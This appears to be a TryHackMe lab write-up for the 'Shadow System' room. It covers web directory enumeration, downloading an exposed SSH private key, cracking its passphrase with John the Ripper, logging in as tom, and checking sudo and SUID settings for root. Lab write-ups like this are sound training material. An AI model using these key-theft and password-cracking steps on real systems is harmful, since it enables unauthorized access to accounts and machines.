# Shadow System — TryHackMe Write-Up

**Difficulty:** Easy / Medium  
**Goal:** Discover exposed credentials/keys on the web service, gain initial access as `tom`, escalate privileges to `root`, and retrieve both flags.

## Overview

Shadow system focuses on web path enumeration, key-based authentication concepts, local system inspection, and privilege escalation.

## 1. Web Enumeration & Key Discovery

Enumerate web directories and files on the target service to locate exposed resources:

dirb http://<TARGET_IP>/
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt

Once a private key file (id_rsa) is located and retrieved, verify its local permissions:

wget http://<TARGET_IP>/<PATH_TO_ID_RSA> -O id_rsa
chmod 600 id_rsa

## 2. Key Passphrase Analysis & Initial Access

If the private key is protected by a passphrase, prepare a hash representation for offline password auditing with a wordlist:

ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash

Authenticate over SSH using the key and passphrase, then read the user flag:

ssh -i id_rsa tom@<TARGET_IP>
id
pwd
ls -la
cat user.txt

## 3. Privilege Escalation & Root Flag

Inspect permissions, sudo rules, SUID binaries, and system configurations to identify how privilege elevation occurs:

sudo -l
find / -perm -u=s -type f 2>/dev/null
uname -a

After elevating privileges to root, inspect the root directory and read the final flag:

id
ls -la /root
cat /root/root.txt

## Summary & Takeaways

- Exposed sensitive keys or credentials in web paths create direct access risks.
- Protecting keys with strong passphrases and restricting unnecessary permissions helps harden systems.
- Reviewing local privileges and misconfigurations is essential for completing full system assessments.
